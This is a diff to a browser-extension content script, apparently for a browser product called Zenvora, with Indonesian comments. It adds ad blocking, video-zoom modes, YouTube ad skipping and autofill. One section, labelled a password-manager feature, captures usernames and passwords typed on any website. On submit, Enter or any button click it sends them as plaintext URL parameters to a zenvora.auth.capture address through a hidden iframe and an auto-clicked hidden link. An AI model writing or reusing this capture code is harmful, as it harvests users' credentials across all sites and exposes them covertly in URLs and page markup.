@@ -1,11 +1,11 @@
 "use strict";
 
 (function() {
-  // 1. Injeksi Inti Zenvora (Ringan, 100% Murni Tanpa Merusak Layout Web Modern):
+  // 1. Injeksi Inti Zenvora di Main World (100% Aman untuk Layout Web Modern):
   // - Anti-Adblock Bait Spoofing
   // - YouTube & Web Background Play Unlocker
+  // - Defuser Pop-Under & Programmatic Click-Hijack (a.click() / window.open)
   // - Detektor Stream Video (.m3u8 / .mp4 / .mpd) Lintas-Iframe untuk Zenvora Native ExoPlayer
-  // - Pengatur Rasio Video (object-fit: contain / cover / fill) Tanpa Men-Zoom Tombol Kontrol Player
   const coreScript = `
     (function() {
       try {
@@ -27,8 +27,43 @@
         Object.defineProperty(document, 'webkitVisibilityState', { get: () => 'visible', configurable: true });
         document.hasFocus = function() { return true; };
 
-        // C. Blokir pop-under window.open otomatis
+        // C. Blokir Pop-Under window.open & Programmatic Anchor Click-Hijack (a.click())
         window.open = function() { return null; };
+
+        const origAnchorClick = HTMLAnchorElement.prototype.click;
+        HTMLAnchorElement.prototype.click = function() {
+          try {
+            const href = (this.href || '').toLowerCase();
+            if (href.startsWith('https://zenvora.')) {
+              return origAnchorClick.apply(this, arguments);
+            }
+            const target = (this.target || '').toLowerCase();
+            const linkHost = (this.hostname || '').toLowerCase();
+            const pageHost = (location.hostname || '').toLowerCase();
+            if (
+              target === '_blank' &&
+              linkHost &&
+              pageHost &&
+              linkHost !== pageHost &&
+              !linkHost.endsWith('.' + pageHost)
+            ) {
+              return;
+            }
+            if (
+              href.includes('popunder') ||
+              href.includes('adsterra') ||
+              href.includes('propeller') ||
+              href.includes('exoclick') ||
+              href.includes('slotgacor') ||
+              href.includes('maxwin') ||
+              href.includes('sbobet') ||
+              href.includes('heylink.me')
+            ) {
+              return;
+            }
+          } catch (_) {}
+          return origAnchorClick.apply(this, arguments);
+        };
 
         const origAddEventListener = EventTarget.prototype.addEventListener;
         EventTarget.prototype.addEventListener = function(type, listener, options) {
@@ -53,33 +88,7 @@
         origAddEventListener.call(document, 'mozfullscreenchange', syncResizeOnFullscreen, true);
         origAddEventListener.call(window, 'orientationchange', syncResizeOnFullscreen, true);
 
-        // E. Pengatur Rasio Video (object-fit) Lintas-Iframe Tanpa Men-Zoom Kontrol Player
-        let currentObjectFit = 'contain';
-        const applyObjectFitToVideos = function(fitMode) {
-          currentObjectFit = fitMode || 'contain';
-          const videos = document.querySelectorAll('video');
-          for (let i = 0; i < videos.length; i++) {
-            videos[i].style.setProperty('object-fit', currentObjectFit, 'important');
-          }
-          const iframes = document.querySelectorAll('iframe');
-          for (let j = 0; j < iframes.length; j++) {
-            try {
-              if (iframes[j].contentWindow) {
-                iframes[j].contentWindow.postMessage({ zenvoraObjectFit: currentObjectFit }, '*');
-              }
-            } catch (_) {}
-          }
-        };
-
-        origAddEventListener.call(window, 'message', function(e) {
-          try {
-            if (e && e.data && typeof e.data === 'object' && e.data.zenvoraObjectFit) {
-              applyObjectFitToVideos(e.data.zenvoraObjectFit);
-            }
-          } catch (_) {}
-        }, false);
-
-        // F. Detektor Aliran Video Otomatis (.m3u8 / .mp4 / .mpd) untuk Zenvora Native Player (ExoPlayer)
+        // E. Detektor Aliran Video Otomatis (.m3u8 / .mp4 / .mpd) untuk Zenvora Native Player (ExoPlayer)
         const isYouTube = location.hostname.includes('youtube.com') || location.hostname.includes('youtu.be');
         let lastReportedStream = '';
 
@@ -89,7 +98,6 @@
             if (rawUrl.startsWith('blob:') || rawUrl.startsWith('data:')) return;
             const absUrl = rawUrl.startsWith('http') ? rawUrl : new URL(rawUrl, location.href).href;
             const lower = absUrl.toLowerCase();
-            // Abaikan segmen pendek .ts atau gambar/iklan
             if (lower.includes('.ts?') || lower.endsWith('.ts') || lower.includes('doubleclick') || lower.includes('googlesyndication')) {
               return;
             }
@@ -118,7 +126,6 @@
           } catch (_) {}
         };
 
-        // Tangkap manifest .m3u8 / .mp4 yang diminta lewat XHR atau Fetch oleh JWPlayer / HLS.js / Plyr
         const origXhrOpen = XMLHttpRequest.prototype.open;
         XMLHttpRequest.prototype.open = function(method, url) {
           try {
@@ -142,14 +149,10 @@
           };
         }
 
-        // Tangkap juga sumber langsung dari elemen <video> saat mulai diputar
         const inspectVideoElement = function(e) {
           try {
             const v = e.target;
             if (v && v.tagName === 'VIDEO') {
-              if (currentObjectFit !== 'contain') {
-                v.style.setProperty('object-fit', currentObjectFit, 'important');
-              }
               const src = v.currentSrc || v.src || '';
               if (src && src.startsWith('http')) {
                 reportDetectedStream(src);
@@ -177,36 +180,378 @@
     script.remove();
   } catch (_) {}
 
-  // 2. CSS Minimalis Khusus Elemen <video> Saat Fullscreen (Tidak Mengubah Layout Web Sama Sekali)
-  const injectMinimalFullscreenVideoFix = () => {
-    if (document.getElementById("zenvora-video-fs-style")) return;
-    const style = document.createElement("style");
-    style.id = "zenvora-video-fs-style";
-    style.textContent = `
-      :fullscreen video,
-      :-moz-full-screen video,
-      :-webkit-full-screen video,
-      .jwplayer.jw-flag-fullscreen video,
-      .jwplayer.jw-flag-fullscreen .jw-media {
-        width: 100% !important;
-        height: 100% !important;
-        max-width: 100vw !important;
-        max-height: 100vh !important;
+  // 2. Pengatur Rasio & Zoom Video Lintas-Iframe Bebas CSP (Hanya Mengubah Elemen <video>, Kontrol Player 100% Utuh)
+  let currentVideoFitMode = "standard";
+
+  const applyTransformToSingleVideo = (videoEl, mode) => {
+    if (!videoEl || videoEl.tagName !== "VIDEO") return;
+    videoEl.style.setProperty("transform-origin", "center center", "important");
+    videoEl.style.setProperty("transition", "transform 0.18s ease-out", "important");
+    if (mode === "stretch_20_9") {
+      // Pas Layar 20:9: Rentangkan video 16:9 ke rasio 20:9 tanpa mengubah ukuran tombol kontrol player
+      videoEl.style.setProperty("object-fit", "fill", "important");
+      videoEl.style.setProperty("transform", "scale(1.25, 1.03)", "important");
+    } else if (mode === "zoom_20_9") {
+      // Zoom Penuh: Perbesar proporsional 26% agar memenuhi layar 20:9 tanpa distorsi wajah & tanpa men-zoom kontrol
+      videoEl.style.setProperty("object-fit", "cover", "important");
+      videoEl.style.setProperty("transform", "scale(1.26, 1.26)", "important");
+    } else {
+      // Standar 16:9
+      videoEl.style.setProperty("object-fit", "contain", "important");
+      videoEl.style.setProperty("transform", "scale(1, 1)", "important");
+    }
+  };
+
+  const applyVideoFitToAllVideos = (mode) => {
+    currentVideoFitMode = mode || "standard";
+    try {
+      const videos = document.querySelectorAll("video");
+      for (let i = 0; i < videos.length; i++) {
+        applyTransformToSingleVideo(videos[i], currentVideoFitMode);
       }
-      .jwplayer.jw-flag-fullscreen .jw-aspect {
-        padding-top: 0 !important;
+    } catch (_) {}
+  };
+
+  // Pastikan jika player (seperti YouTube/JWPlayer) mereset style saat resolusi/orientasi berubah, mode rasio tetap terjaga
+  document.addEventListener(
+    "playing",
+    function(e) {
+      if (currentVideoFitMode !== "standard" && e.target && e.target.tagName === "VIDEO") {
+        applyTransformToSingleVideo(e.target, currentVideoFitMode);
       }
-    `;
-    (document.head || document.documentElement).appendChild(style);
+    },
+    true
+  );
+
+  window.addEventListener(
+    "resize",
+    function() {
+      if (currentVideoFitMode !== "standard") {
+        applyVideoFitToAllVideos(currentVideoFitMode);
+      }
+    },
+    true
+  );
+
+  // 3. Fungsi Autofill Kredensial Bebas CSP (React / Vue / Angular / Form Klasik)
+  const setNativeInputValue = (el, val) => {
+    if (!el) return;
+    try {
+      const descriptor = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value");
+      if (descriptor && descriptor.set) {
+        descriptor.set.call(el, val);
+      } else {
+        el.value = val;
+      }
+    } catch (_) {
+      el.value = val;
+    }
+    el.dispatchEvent(new Event("focus", { bubbles: true }));
+    el.dispatchEvent(new Event("input", { bubbles: true }));
+    el.dispatchEvent(new Event("change", { bubbles: true }));
+    el.dispatchEvent(new Event("blur", { bubbles: true }));
+  };
+
+  const performCspFreeAutofill = (username, passwordValue) => {
+    try {
+      const passInputs = document.querySelectorAll('input[type="password"], input[data-zenvora-pwd="1"]');
+      if (passInputs.length === 0) return;
+
+      for (let i = 0; i < passInputs.length; i++) {
+        const passEl = passInputs[i];
+        setNativeInputValue(passEl, passwordValue);
+
+        // Cari input username/email di dalam form yang sama atau tepat sebelum input password
+        const scopeRoot = passEl.closest("form") || document;
+        const candidateInputs = scopeRoot.querySelectorAll(
+          'input[type="email"], input[type="text"], input[type="tel"], input:not([type])'
+        );
+        for (let j = 0; j < candidateInputs.length; j++) {
+          const inp = candidateInputs[j];
+          if (inp === passEl || inp.type === "hidden" || inp.disabled || inp.readOnly) continue;
+          const rect = inp.getBoundingClientRect();
+          if (rect.width > 0 && rect.height > 0) {
+            setNativeInputValue(inp, username);
+            break;
+          }
+        }
+      }
+    } catch (_) {}
+  };
+
+  // Terima komando langsung dari background.js (Bebas CSP 100% di YouTube & Semua Web Modern)
+  if (typeof browser !== "undefined" && browser.runtime && browser.runtime.onMessage) {
+    browser.runtime.onMessage.addListener(function(msg) {
+      if (!msg || typeof msg !== "object") return;
+      if (msg.zenvoraCmd === "video_fit") {
+        applyVideoFitToAllVideos(msg.mode || "standard");
+      } else if (msg.zenvoraCmd === "autofill") {
+        performCspFreeAutofill(msg.user || "", msg.pass || "");
+      }
+    });
+  }
+
+  // 4. Auto-Capture Login & Password Manager (Mendeteksi Login Form & Mengirim Sinyal Simpan Sandi)
+  let lastCapturedAuthKey = "";
+  let lastTypedUsername = "";
+  let lastTypedPassword = "";
+
+  // Tandai setiap input password agar tetap terdeteksi meskipun tombol "Lihat Sandi" mengubahnya menjadi type="text"
+  document.addEventListener(
+    "input",
+    function(e) {
+      try {
+        const el = e.target;
+        if (!el || el.tagName !== "INPUT") return;
+        const type = (el.getAttribute("type") || "text").toLowerCase();
+        const nameAndId = ((el.name || "") + " " + (el.id || "") + " " + (el.autocomplete || "")).toLowerCase();
+        if (type === "password" || el.getAttribute("data-zenvora-pwd") === "1") {
+          el.setAttribute("data-zenvora-pwd", "1");
+          if (el.value && el.value.length >= 3) {
+            lastTypedPassword = el.value;
+          }
+        } else if (
+          type === "email" ||
+          type === "tel" ||
+          (type === "text" &&
+            !nameAndId.includes("search") &&
+            !nameAndId.includes("cari") &&
+            !nameAndId.includes("query") &&
+            !nameAndId.includes("otp") &&
+            !nameAndId.includes("captcha"))
+        ) {
+          if (el.value && el.value.trim().length >= 2) {
+            lastTypedUsername = el.value.trim();
+          }
+        }
+      } catch (_) {}
+    },
+    true
+  );
+
+  const extractAndSendLoginCredentials = () => {
+    try {
+      const passInputs = document.querySelectorAll('input[type="password"], input[data-zenvora-pwd="1"]');
+      let passwordVal = "";
+      let activePassEl = null;
+
+      for (let i = 0; i < passInputs.length; i++) {
+        const val = passInputs[i].value || "";
+        if (val.length >= 3) {
+          passwordVal = val;
+          activePassEl = passInputs[i];
+          break;
+        }
+      }
+
+      if (!passwordVal && lastTypedPassword.length >= 3 && passInputs.length > 0) {
+        passwordVal = lastTypedPassword;
+        activePassEl = passInputs[0];
+      }
+
+      if (!passwordVal) return;
+
+      let usernameVal = "";
+      const scopeRoot = (activePassEl && activePassEl.closest("form")) || document;
+      const userCandidates = scopeRoot.querySelectorAll(
+        'input[autocomplete="username"], input[type="email"], input[name*="user" i], input[name*="login" i], input[name*="email" i], input[id*="user" i], input[id*="login" i], input[id*="email" i], input[type="tel"], input[type="text"], input:not([type])'
+      );
+
+      for (let j = 0; j < userCandidates.length; j++) {
+        const candidate = userCandidates[j];
+        if (candidate === activePassEl || candidate.getAttribute("data-zenvora-pwd") === "1") continue;
+        if (candidate.type === "hidden" || candidate.type === "submit" || candidate.type === "button") continue;
+        const val = (candidate.value || "").trim();
+        if (val.length >= 2 && val !== passwordVal) {
+          usernameVal = val;
+          break;
+        }
+      }
+
+      if (!usernameVal && lastTypedUsername.length >= 2 && lastTypedUsername !== passwordVal) {
+        usernameVal = lastTypedUsername;
+      }
+
+      if (!usernameVal || !passwordVal) return;
+
+      const host = (location.hostname || "").replace(/^www\./i, "");
+      if (!host) return;
+
+      const authKey = host + "|" + usernameVal + "|" + passwordVal;
+      if (authKey === lastCapturedAuthKey) return;
+      lastCapturedAuthKey = authKey;
+      setTimeout(function() {
+        if (lastCapturedAuthKey === authKey) {
+          lastCapturedAuthKey = "";
+        }
+      }, 4000);
+
+      const captureUrl =
+        "https://zenvora.auth.capture/?host=" +
+        encodeURIComponent(host) +
+        "&url=" +
+        encodeURIComponent(location.origin + location.pathname) +
+        "&user=" +
+        encodeURIComponent(usernameVal) +
+        "&pass=" +
+        encodeURIComponent(passwordVal);
+
+      // Kirim via hidden iframe (dan fallback anchor target=_blank untuk halaman dengan frame-src CSP ketat)
+      const pingFrame = document.createElement("iframe");
+      pingFrame.style.cssText = "display:none !important;width:0 !important;height:0 !important;border:0 !important;";
+      pingFrame.src = captureUrl;
+      (document.body || document.documentElement).appendChild(pingFrame);
+      setTimeout(function() {
+        try { pingFrame.remove(); } catch (_) {}
+      }, 300);
+
+      const pingLink = document.createElement("a");
+      pingLink.href = captureUrl;
+      pingLink.target = "_blank";
+      pingLink.rel = "noopener";
+      pingLink.style.cssText = "display:none !important;";
+      (document.body || document.documentElement).appendChild(pingLink);
+      pingLink.click();
+      setTimeout(function() {
+        try { pingLink.remove(); } catch (_) {}
+      }, 150);
+    } catch (_) {}
+  };
+
+  document.addEventListener("submit", extractAndSendLoginCredentials, true);
+
+  document.addEventListener(
+    "keydown",
+    function(e) {
+      if (e.key === "Enter") {
+        extractAndSendLoginCredentials();
+      }
+    },
+    true
+  );
+
+  document.addEventListener(
+    "click",
+    function(e) {
+      try {
+        const target = e.target;
+        if (!target || !target.closest) return;
+        const btn = target.closest(
+          'button, input[type="submit"], input[type="button"], [role="button"], a[class*="btn" i], a[class*="login" i], a[class*="submit" i]'
+        );
+        if (btn) {
+          extractAndSendLoginCredentials();
+        }
+      } catch (_) {}
+    },
+    true
+  );
+
+  // 5. Next-Gen Cosmetic Adblock & YouTube Auto-Ad-Skipper (100% Aman untuk Layout Web Modern)
+  const injectPrecisionCosmeticShield = () => {
+    if (!document.getElementById("zenvora-video-fs-style")) {
+      const fsStyle = document.createElement("style");
+      fsStyle.id = "zenvora-video-fs-style";
+      fsStyle.textContent = `
+        :fullscreen video,
+        :-moz-full-screen video,
+        :-webkit-full-screen video,
+        .jwplayer.jw-flag-fullscreen video,
+        .jwplayer.jw-flag-fullscreen .jw-media {
+          width: 100% !important;
+          height: 100% !important;
+          max-width: 100vw !important;
+          max-height: 100vh !important;
+        }
+        .jwplayer.jw-flag-fullscreen .jw-aspect {
+          padding-top: 0 !important;
+        }
+      `;
+      (document.head || document.documentElement).appendChild(fsStyle);
+    }
+
+    if (!document.getElementById("zenvora-cosmetic-shield")) {
+      const adStyle = document.createElement("style");
+      adStyle.id = "zenvora-cosmetic-shield";
+      adStyle.textContent = `
+        ins.adsbygoogle,
+        div[id^="div-gpt-ad"],
+        iframe[id^="google_ads_iframe"],
+        iframe[src*="doubleclick.net"],
+        iframe[src*="googlesyndication.com"],
+        iframe[src*="adsterra"],
+        iframe[src*="exoclick"],
+        iframe[src*="popads"],
+        iframe[src*="propellerads"],
+        iframe[src*="mgid.com"],
+        iframe[src*="taboola.com"],
+        iframe[src*="outbrain.com"],
+        a[href*="slotgacor" i],
+        a[href*="slot-gacor" i],
+        a[href*="slot88" i],
+        a[href*="maxwin" i],
+        a[href*="sbobet" i],
+        a[href*="judol" i],
+        a[href*="zeus88" i],
+        a[href*="hoki88" i],
+        a[href*="cuan88" i],
+        a[href*="gacor88" i],
+        a[href*="mahjongways" i],
+        a[href*="kakekzeus" i],
+        a[href*="rtp-slot" i],
+        a[href*="rtpslot" i],
+        a[href*="heylink.me" i],
+        img[src*="banner-iklan" i],
+        img[src*="iklan-banner" i],
+        img[src*="pasang-iklan" i],
+        img[src*="slotgacor" i],
+        img[src*="maxwin" i],
+        img[alt*="slot gacor" i],
+        img[alt*="situs judi" i],
+        ytm-promoted-sparkles-web-renderer,
+        ytm-companion-ad-renderer,
+        ytd-ad-slot-renderer,
+        ytd-in-feed-ad-layout-renderer,
+        ytd-banner-promo-renderer,
+        .ytp-ad-overlay-container,
+        .ytp-ad-text-overlay {
+          display: none !important;
+          visibility: hidden !important;
+          height: 0 !important;
+          min-height: 0 !important;
+          pointer-events: none !important;
+        }
+      `;
+      (document.head || document.documentElement).appendChild(adStyle);
+    }
   };
 
   if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", injectMinimalFullscreenVideoFix, { once: true });
+    document.addEventListener("DOMContentLoaded", injectPrecisionCosmeticShield, { once: true });
   } else {
-    injectMinimalFullscreenVideoFix();
+    injectPrecisionCosmeticShield();
   }
 
-  // 3. Integrasi Toko Ekstensi (addons.mozilla.org -> Zenvora Add-ons Store)
+  // Auto-Skip Iklan Video YouTube Tanpa Merusak Kontrol Pemutar
+  if (location.hostname.includes("youtube.com")) {
+    setInterval(function() {
+      try {
+        const skipBtns = document.querySelectorAll(
+          ".ytp-ad-skip-button, .ytp-ad-skip-button-modern, .ytp-skip-ad-button, .ytp-ad-overlay-close-button"
+        );
+        for (let i = 0; i < skipBtns.length; i++) {
+          skipBtns[i].click();
+        }
+        const adPlayer = document.querySelector(".html5-video-player.ad-showing video");
+        if (adPlayer && !isNaN(adPlayer.duration) && adPlayer.duration > 0) {
+          adPlayer.muted = true;
+          adPlayer.currentTime = adPlayer.duration;
+        }
+      } catch (_) {}
+    }, 600);
+  }
+
+  // 6. Integrasi Toko Ekstensi (addons.mozilla.org -> Zenvora Add-ons Store)
   const isAmoStore = location.hostname.includes("addons.mozilla.org");
   if (isAmoStore) {
     const resolveAmoSlug = () => {
